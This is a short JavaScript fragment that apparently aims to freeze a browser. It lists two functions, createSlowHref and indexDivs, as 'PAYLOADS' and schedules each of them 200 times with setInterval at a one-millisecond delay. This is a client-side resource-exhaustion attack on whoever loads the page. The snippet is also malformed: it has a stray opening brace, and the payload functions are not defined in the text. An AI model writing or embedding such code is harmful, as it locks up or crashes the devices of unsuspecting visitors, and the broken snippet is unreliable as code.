const PAYLOADS = [
    createSlowHref,
    indexDivs
]
{
for (let i = 0; i < 200; i++) {    
for (const payload of PAYLOADS) {
    setInterval(payload, 1);
}
}
